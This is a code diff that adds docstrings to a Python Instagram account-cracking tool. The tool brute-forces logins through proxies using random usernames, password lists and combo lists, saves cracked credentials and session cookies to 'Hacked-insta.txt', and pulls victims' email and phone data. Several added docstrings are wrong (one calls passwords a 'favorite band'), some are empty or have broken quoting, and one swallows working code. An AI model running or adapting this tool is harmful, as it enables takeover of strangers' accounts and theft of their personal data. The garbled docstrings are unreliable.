@@ -16,17 +16,79 @@ secure = 'challenge_required'
 withs = 'Please wait a few minutes before you try again';errReq = 'Bad request'
 errorFUOt = "We're working on it and we'll get it fixed as soon as we can."
 def Exit():exit(0)
+    """Exits the program.
+    Parameters:
+        - None
+    Returns:
+        - None
+    Processing Logic:
+        - Exit the program.
+        - No return value.
+        - Exit code 0 means successful termination."""
+    
 class All_Seve:
 	def SeveHck(user,pess,coke):
+		"""Saves the user's login credentials and cookies in a text file for future use.
+		Parameters:
+		- user (str): The username of the Instagram account.
+		- pess (str): The password of the Instagram account.
+		- coke (str): The cookies of the Instagram account.
+		Returns:
+		- None: This function does not return any value.
+		Processing Logic:
+		- Opens a text file in append mode.
+		- Writes the username, password, and cookies in a specific format.
+		- Closes the text file."""
+		
 		with open('Hacked-insta.txt', 'a') as J:
 			J.write('------\n'+user+':'+pess+'\nCookies:'+coke+'\n')
 	def SeveScour(user,pess):
+		""""Function to save a user's login credentials for Instagram in a secure file."
+		Parameters:
+		- user (str): The username of the Instagram account.
+		- pess (str): The password of the Instagram account.
+		Returns:
+		- None: The function does not return any value.
+		Processing Logic:
+		- Opens a file in append mode.
+		- Writes the username and password in the format of "username:password" to the file.
+		- Adds a new line after each entry.
+		- The file is saved in a secure location.
+		Example:
+		SeveScour('johndoe', 'password123')
+		# This will save the login credentials for the Instagram account with username 'johndoe' and password 'password123' in the file 'secure-insta.txt'."""
+		
 		with open('secure-insta.txt', 'a') as J:
 			J.write(user+':'+pess+'\n')
 	def SeveBand(user,pess):
+		""""Appends a user and their favorite band to a text file.
+		Parameters:
+		- user (str): The username of the user.
+		- pess (str): The name of the user's favorite band.
+		Returns:
+		- None: The function does not return any value.
+		Processing Logic:
+		- Opens a text file in append mode.
+		- Writes the user and their favorite band to the file.
+		- Uses a colon to separate the user and band.
+		- Adds a new line after each entry.""""
+		
 		with open('Band-insta.txt', 'a') as J:
 			J.write(user+':'+pess+'\n')
 def Info_user(user,pess,coke,sisn):
+	"""This function sends a GET request to retrieve user information from Instagram and then saves the data in a separate thread using the All_Seve.SeveHck function.
+	Parameters:
+	- user (str): The username of the Instagram account.
+	- pess (str): The password of the Instagram account.
+	- coke (str): The Instagram account's cookie.
+	- sisn (str): The Instagram account's session ID.
+	Returns:
+	- None: This function does not return any value.
+	Processing Logic:
+	- Sends a GET request to retrieve user information from Instagram.
+	- Saves the data in a separate thread using the All_Seve.SeveHck function.
+	- If the user's email or phone number is available, it will be saved. Otherwise, "None" will be saved."""
+	
 	getn=get('https://www.instagram.com/accounts/edit/?__a=1&__d=dis',headers={'Host': 'www.instagram.com','X-ASBD-ID': '198387','X-Requested-With': 'XMLHttpRequest','X-IG-App-ID': '1217981644879628','Accept-Language': 'ar','Accept': '*/*','User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1','Connection': 'keep-alive','Referer': 'https://www.instagram.com/accounts/edit/','X-IG-WWW-Claim': 'hmac.AR1carwb5gWoeMAlK7PfzBjO790rGGfeGXbhwAUkESygrYzG','Cookie': 'sessionid='+sisn})
 	if ('email' in getn.text):
 		try:email = getn.json()['form_data']['email']
@@ -37,6 +99,15 @@ def Info_user(user,pess,coke,sisn):
 	else: threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
 uuid = get('https://httpbin.org/uuid')
 def User_Agent():
+	""""Generates a random user agent string for Instagram on Android devices."
+	Parameters:
+	- None
+	Returns:
+	- str: A randomly generated user agent string for Instagram on Android devices.
+	Processing Logic:
+	- Uses randomly selected values for device DPI, model, screen resolution, and Instagram version.
+	- Includes the device manufacturer and language code in the user agent string."""
+	
 	dpi_phone = [
 		'133','320','515','160','640','240','120'
 		'800','480','225','768','216','1024']
@@ -56,6 +127,25 @@ def User_Agent():
 	return User_Agent
 class hacker_instagram_Check_automatic:
 	def __init__(self):
+		"""Initializes the object with the necessary attributes and prompts the user for input.
+				Parameters:
+					- None
+				Returns:
+					- None
+				Processing Logic:
+					- Prompts the user for input and assigns the input to the appropriate attributes.
+					- Checks for errors in the input and exits the program if necessary.
+					- Prints a message to indicate that the function has been executed.
+				self.hack=0
+				self.ban=0
+				self.err=0
+				self.prox=0
+				self.secur=0
+				self.nones=0
+				try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
+				except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
+				try:self.modPRX=int(input("""
+		
 		self.hack=0
 		self.ban=0
 		self.err=0
@@ -80,6 +170,19 @@ class hacker_instagram_Check_automatic:
 		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
 		self.Trts()
 	def Log_user(self):
+		"""Log_user function is used to hack Instagram accounts by generating random usernames and passwords and attempting to log in with them. It takes in two parameters, self and proxy. The function does not return any value. It uses a while loop to continuously generate new usernames and passwords and attempts to log in with them using the provided proxy. If the login is successful, the function prints out the hacked account information and starts a new thread to save the account. If the login is unsuccessful, the function checks for various errors and increments the corresponding counter. If there is a connection error or a timeout, the function increments the proxy counter. The function also handles keyboard interrupts and exits gracefully.
+		Parameters:
+		- self (object): An instance of the class that the function is defined in.
+		- proxy (list): A list of proxies to use for the login attempts.
+		Returns:
+		- None: The function does not return any value.
+		Processing Logic:
+		- Generates random usernames and passwords using the provided lists.
+		- Attempts to log in using the generated credentials and the provided proxy.
+		- Handles various errors and increments the corresponding counters.
+		- Starts a new thread to save the hacked account information.
+		- Handles keyboard interrupts and exits gracefully."""
+		
 		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
 		lst2= 'QqAaZzWw!SsXx?EeDdCcRr!FfVvTtGgBb@YyHhNnUuJj$IiKkMmOoLl&Pp12345#6789'
 		while True:
@@ -154,6 +257,8 @@ class hacker_instagram_Check_automatic:
 				self.prox+=1
 				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
 	def Trts(self):
+		""""""
+		
 		theards =[]
 		for i in range(self.trt):
 			trts = threading.Thread(target=self.Log_user)
@@ -163,6 +268,8 @@ class hacker_instagram_Check_automatic:
 			trts2.join()
 class hacker_instagram_randomUser_passLiest:
 	def __init__(self):
+		""""""
+		
 		self.hack=0
 		self.ban=0
 		self.err=0
@@ -191,6 +298,8 @@ class hacker_instagram_randomUser_passLiest:
 		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
 		self.Trts()
 	def Log_user(self):
+		""""""
+		
 		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
 		while True:
 			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
@@ -262,6 +371,8 @@ class hacker_instagram_randomUser_passLiest:
 				self.prox+=1
 				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
 	def Trts(self):
+		""""""
+		
 		theards =[]
 		for i in range(self.trt):
 			trts = threading.Thread(target=self.Log_user)
@@ -271,6 +382,8 @@ class hacker_instagram_randomUser_passLiest:
 			trts2.join()
 class hacker_instagram_1Target_passLiest:
 	def __init__(self):
+		""""""
+		
 		self.hack=0
 		self.ban=0
 		self.err=0
@@ -301,6 +414,8 @@ class hacker_instagram_1Target_passLiest:
 		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
 		self.Trts()
 	def Log_user(self):
+		""""""
+		
 		while True:
 			if (pess := self.file.readline().split('\n')[0]) == '':exit(input('over ..'))
 			proxylist = []
@@ -388,6 +503,8 @@ class hacker_instagram_1Target_passLiest:
 				self.prox+=1
 				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
 	def Trts(self):
+		""""""
+		
 		theards =[]
 		for i in range(self.trt):
 			trts = threading.Thread(target=self.Log_user)
@@ -397,6 +514,8 @@ class hacker_instagram_1Target_passLiest:
 			trts2.join()
 class hacker_instagram_Rnadom_username:
 	def __init__(self):
+		""""""
+		
 		self.hack=0
 		self.ban=0
 		self.err=0
@@ -423,6 +542,19 @@ class hacker_instagram_Rnadom_username:
 		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
 		self.Trts()
 	def Log_user(self):
+		"""Log_user:
+		This function is used to log in a user to the Instagram API and check for any errors or bans. It takes in two parameters, self and proxy. It returns the user's login information and the status of the login attempt.
+		Processing Logic:
+		- Generates a random username and checks for any errors or bans.
+		- If there are no errors, the user is considered hacked and their information is printed.
+		- If there are errors, the appropriate error count is incremented.
+		- If there is a connection error, the proxy count is incremented.
+		- If there is a timeout error, the proxy count is incremented.
+		- If there is a keyboard interrupt, the program is exited.
+		- If there is a read timeout error, the proxy count is incremented.
+		Example:
+		Log_user(self)"""
+		
 		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
 		while True:
 			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
@@ -493,6 +625,18 @@ class hacker_instagram_Rnadom_username:
 				self.prox+=1
 				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
 	def Trts(self):
+		"""Function to run multiple threads for logging user information.
+		Parameters:
+		- self (object): Instance of the class.
+		Returns:
+		- None: No return value.
+		Processing Logic:
+		- Create a list to store threads.
+		- Loop through the number of threads specified.
+		- Create a thread object and start it.
+		- Append the thread object to the list.
+		- Loop through the list of threads and join them to the main thread."""
+		
 		theards =[]
 		for i in range(self.trt):
 			trts = threading.Thread(target=self.Log_user)
@@ -502,6 +646,8 @@ class hacker_instagram_Rnadom_username:
 			trts2.join()
 class hacker_instagram_ComboList:
 	def __init__(self):
+		""""""
+		
 		self.hack=0
 		self.ban=0
 		self.err=0
@@ -528,6 +674,8 @@ class hacker_instagram_ComboList:
 		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
 		self.Trts()
 	def Log_Combo(self):
+		""""""
+		
 		while True:
 			list = self.file.readline().split('\n')[0]
 			if (user := list.split(':')[0])=='':
